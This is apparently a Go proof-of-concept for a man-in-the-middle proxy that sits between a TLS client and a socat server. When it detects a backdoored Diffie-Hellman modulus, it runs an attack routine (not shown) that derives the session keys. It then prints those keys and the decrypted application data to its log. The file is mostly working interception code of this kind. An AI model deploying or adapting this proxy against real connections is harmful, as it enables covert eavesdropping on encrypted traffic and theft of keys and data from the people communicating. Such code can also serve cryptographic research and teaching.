package main

import (
	"log"
	"bytes"
	"encoding/binary"
	"flag"
	"net"
	"fmt"
	"io"
	"os"

	"crypto/aes"
	"crypto/cipher"
)

// get client and server ip:port
var localAddr *string = flag.String("l", "localhost:6666", "this proxy address")
var serverAddr *string = flag.String("r", "localhost:5443", "socat server address")

// global vars
var handshake_step int
var client_encrypted = false
var server_encrypted = false

var clientRandom [32]byte
var serverRandom [32]byte
var modulus []byte 
var generator []byte
var serverPubkey []byte
var clientPubkey []byte

var client_write_MAC_key []byte
var server_write_MAC_key []byte
var client_write_key []byte
var server_write_key []byte

// Parse the first TLS record, returns the en
func parseTLSRecord(payload []byte) (int) {
	// settings
	record_length := int(binary.BigEndian.Uint32(append([]byte{0x0}, payload[1:4]...)))

	// what type of record?
	if payload[0] == 1 { // clientHello
		log.Println("parsing clientHello")
		handshake_step = 1
		// clientRandom (need to strip the first 4 bytes though I think)
		copy(clientRandom[:], payload[6:32+6]) 
		log.Println("clientRandom:", clientRandom)

	} else if payload[0] == 2 && handshake_step == 1 { // serverHello
		log.Println("parsing serverHello")
		handshake_step = 2
		// serverRandom
		copy(serverRandom[:], payload[6:32+6])
		log.Println("serverRandom:", serverRandom)
		// cipherSuite
		/*
		ciphersuite = binary.BigEndian.Uint16(payload[32+7:32+7+3])
		log.Println("cipherSuite:", cipherSuite)
*/

	} else if payload[0] == 12 && handshake_step == 2 { // serverKeyExchange
		log.Println("parsing serverKeyExchange")
		handshake_step = 12
		// modulus
		modulus_size := int(binary.BigEndian.Uint16(payload[4:6]))
		offset := 6
		modulus = make([]byte, modulus_size)
		copy(modulus, payload[offset:offset+modulus_size])
		log.Println("modulus:", modulus)
		// generator
		offset += modulus_size
		generator_size := int(binary.BigEndian.Uint16(payload[offset:offset+2]))
		offset += 2
		generator = make([]byte, generator_size)
		copy(generator, payload[offset:offset+generator_size])
		log.Println("generator:", generator)

		// check if modulus is backdoored
		if !backdoored(modulus, generator){
			handshake_step = 1
		} else {
			// server public key
			offset += generator_size

			pubkeyLength := int(binary.BigEndian.Uint16(payload[offset:offset+2]))
			offset += 2

			serverPubkey = make([]byte, pubkeyLength)
			copy(serverPubkey, payload[offset:offset+pubkeyLength])
			log.Println("serverPubkey:", serverPubkey)
		}
		
	} else if payload[0] == 16 && handshake_step == 12 { // clientKeyExchange
		log.Println("parsing clientKeyExchange")
		handshake_step = 16
		// client public key
		pubkeyLength := int(binary.BigEndian.Uint16(payload[4:6]))
		clientPubkey = make([]byte, pubkeyLength)
		copy(clientPubkey, payload[6:6+pubkeyLength])
		log.Println("clientPubkey:", clientPubkey)
		// perform the attack
		log.Println("starting the attack!")
		client_write_MAC_key, server_write_MAC_key, client_write_key, server_write_key = attack(serverPubkey, clientPubkey, serverRandom[:], clientRandom[:]) // use of `go attack` ?
		log.Println("got keys!")
		log.Println("client_write_MAC_key=", client_write_MAC_key)
		log.Println("server_write_MAC_key=", server_write_MAC_key)
		log.Println("client_write_key=", client_write_key)
		log.Println("server_write_key=", server_write_key)

/*
  } else if payload[0] == 22 && handshake_step == 16 { // Encrypted Finished
		log.Println("reached the encrypted finished")
		// verify if the MAC_key is correct
		if label == "server" {
			
		} else { // client

		}
*/
	} else {
		log.Println(" | -> parsing something else")
	}

	// return the index of the next record
	return record_length + 1 + 3
}


// function to decrypt a payload
// we assume no compression algorithm used
func decrypt(label string, payload []byte) []byte {
	//log.Println(" | attempting to decrypt")
	// what key to use?
	var relevant_key []byte
	if label == "server" {
		relevant_key = server_write_key
	} else {
		relevant_key = client_write_key
	}

	// init AES
	block, _ := aes.NewCipher(relevant_key)
	iv := payload[:16]
	//log.Println(" | -iv:", iv)
	ciphertext := make([]byte, len(payload[16:]))
	copy(ciphertext, payload[16:]) // we don't want to modify the payload
	//log.Println(" | -ct:", ciphertext)

	if len(ciphertext) % 16 != 0 {
		log.Println(" | <warning> size of ciphertext is not a multiple of 128bits")
	} else {
		mode := cipher.NewCBCDecrypter(block, iv)
		mode.CryptBlocks(ciphertext, ciphertext)
	}

	// remove padding
	//log.Println(" | -pt+mac+padd:", ciphertext)
	len_padding := int(ciphertext[len(ciphertext) - 1])
	//log.Println(" | -padding:", int(len_padding))
	ciphertext = ciphertext[:len(ciphertext) - len_padding]
	
	//log.Println(" | -pt+mac     :", ciphertext)

	// remove 32 bytes of the HMAC-SHA256 tag
	ciphertext = ciphertext[:len(ciphertext) - 32]
	//log.Println(" | -pt         :", ciphertext)

	return ciphertext
}

// the forwarder/parser
func forwardTLS(r io.Reader, w io.Writer, label string) {
	header := make([]byte, 5)

	//
	// FOR LOOP
	//
	for {
		// read header
		log.Println("--- new packet from", label, "---")

		read, err := io.ReadFull(r, header)
		if err != nil {
			// end of connection? connection closed?
			if err == io.EOF || err == io.ErrClosedPipe {
				log.Printf("received err: %v", err)
			} else {
				log.Printf("received err: %v", err)
			}
			server_encrypted = false
			client_encrypted = false
			handshake_step = 0
			break
		}

		//log.Println(" | header", header)

		payload_length := int(binary.BigEndian.Uint16(header[3:5]))
		payload := make([]byte, payload_length)
		//log.Println(" | payload length: ", payload_length)

		if read != 5 {
			log.Println("tcp: can't read header, read only ", read)
		}

		//
		// PARSE HEADER
		//
		if header[0] == 0x16 {
			log.Println(" | tls:handshake")
			// get version
			/*
			if version == nil {
				version = binary.BigEndian.Uint16(payload[1:3])
			}
*/
		} else if header[0] == 0x14 {
			log.Println(" | tls:changeCipherSpec")
			if label == "server" {
				server_encrypted = true
			} else {
				client_encrypted = true
			}
		} else if header[0] == 0x17 {
			log.Println(" | tls:application data")
		} else if header[0] == 0x15 {
			log.Println(" | tls:alert")
		} else if header[0] == 0x18 {
			log.Println(" | tls:heartbeat")
		} else {
			//
			// packet is not a TLS record (must be http?)
			//
			log.Println(" | tcp:PACKET IS NOT A TLS RECORD! ", header)

			// read until \r or \n
			buf := &bytes.Buffer{}
			for {
				data := make([]byte, 256)
				n, err := r.Read(data)
				if err != nil {
					panic(err)
				}
				buf.Write(data[:n])
				if data[0] == '\r' && data[1] == '\n' {
					break
				}
			}

			// write everything
			if _, err := w.Write(append(header, buf.Bytes()...)); err != nil {
				panic(err)
			}

			// skip the TLS part
			continue

		}

		//
		// read the TLS payload
		// 
		_, err = io.ReadFull(r, payload)
		if err != nil {
			panic(err)
		}

		//log.Println(" | payload:")
		//log.Println(" | ", payload)

		// parse the record it's a handshake
		if header[0] == 0x16 {
			//
			// Decrypt
			//
			if (label == "server" && server_encrypted) || (label == "client" && client_encrypted) {
				log.Println(" | encrypted handshake message")
			} else { // PLAINTEXT handshake
				offset := 0
				for offset < len(payload) {
					offset += parseTLSRecord(payload[offset:])
				}
			}
		}

		//
		// Try decrypting the payload
		//
		if header[0] != 0x14 { // header[0] != 0x14 { // no ChangeCipherSPec
			if (server_encrypted && label == "server" && server_write_key != nil) || (client_encrypted && label == "client" && client_write_key != nil) {
				decrypted := decrypt(label, payload)
				//log.Println(" | decrypted")
				if header[0] == 0x17 {
					//log.Printf(" | hex:  %x\n", decrypted)
					log.Printf(" | string: %s\n", decrypted)
				} else {
					log.Printf(" | hex: %x\n", decrypted)
				}
			}
		}

		//
		// Write on the stream
		//
		_, err = w.Write(append(header, payload...))
		if err != nil {
			panic(err)
		}
		
	} // endfor
}

// forwarding traffic
func handleConnection(client net.Conn) {
	log.Println("connection accepted")
	// dial the ip
	log.Println("forwarding to", *serverAddr)

	saddr, err := net.ResolveTCPAddr("tcp", *serverAddr)
	if err != nil {
		panic(err)
	}

	server, err := net.DialTCP("tcp", nil, saddr)
	if err != nil {
		panic(err)
	}

	defer client.Close()
	defer server.Close()

	go forwardTLS(client, server, "client")
	forwardTLS(server, client, "server")
}

//
func main() {
	// get client and server's ip:port
	flag.Parse()

	// accept (as many connections atm)
	laddr, err := net.ResolveTCPAddr("tcp", *localAddr)
	if err != nil {
		panic(err)
	}

	// setting up the proxy
	local, err := net.ListenTCP("tcp", laddr)
	if local == nil {
		fatal("cannot listen: %v", err)
	}

	log.Println("running proxy on", laddr)
	for {
		conn, err := local.AcceptTCP()
		if conn == nil {
			fatal("accept failed: %v", err)
		}
		go handleConnection(conn)
	}
}

func fatal(s string, a ... interface{}) {
	fmt.Fprintf(os.Stderr, "netfwd: %s\n", fmt.Sprintf(s, a))
	os.Exit(2)
}
